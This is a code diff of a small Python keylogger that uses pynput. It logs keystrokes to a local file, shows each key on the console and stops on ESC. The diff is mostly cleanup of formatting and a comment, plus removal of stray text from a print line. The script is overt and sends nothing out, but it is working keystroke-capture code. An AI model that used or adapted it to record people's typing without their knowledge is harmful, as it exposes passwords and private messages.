@@ -1,6 +1,6 @@
 from pynput import keyboard
 import sys
-# keylogger program by - Shaik Abbu Bakar Siddik
+# The keylogger program written by - Shaik Abbu Bakar Siddik 
 LOG_FILE_PATH = "keylog.txt"
 
 def on_key_press(key):
@@ -8,15 +8,18 @@ def on_key_press(key):
         key_str = key.char
     except AttributeError:
         key_str = str(key)
-    print(f"Key pressed: {key_str}  \n", end='', flush=True)
+    
+    print(f"Key pressed: {key_str}\n", end='', flush=True)
+
     with open(LOG_FILE_PATH, "a") as log_file:
         log_file.write(key_str)
+
     if key == keyboard.Key.esc:
         print("\nESC key pressed. Exiting...")
         return False
 
 def main():
-    print("Keylogger started. Press ESC to stop.")we need justice
+    print("Keylogger started. Press ESC to stop.")
     with keyboard.Listener(on_press=on_key_press) as listener:
         listener.join()
 
